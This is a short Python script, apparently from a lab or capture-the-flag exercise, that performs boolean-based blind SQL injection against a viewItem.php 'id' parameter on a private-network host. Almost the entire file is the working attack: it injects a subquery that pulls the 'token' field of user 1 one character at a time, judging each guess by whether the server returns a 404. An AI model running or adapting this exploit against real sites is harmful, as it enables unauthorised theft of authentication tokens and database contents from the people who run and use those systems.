#!/usr/bin/python3

# boolean-based blind sql injection on http://<server>/item/viewItem.php?id=1

import requests

t = ''
x = 1

while(1):
    for i in range(0,255):
        url = 'http://192.168.139.142/item/viewItem.php?id=1+AND+(SELECT+IF(1,(ASCII(SUBSTRING((SELECT+token+FROM+user+where+id%3d1),' + str(x) + ',1))%3d' + str(i) + '),0))'
        r = requests.get(url)
        if r.status_code == 404:
            t = t+str(chr(i))
            x = x + 1
            print(t)
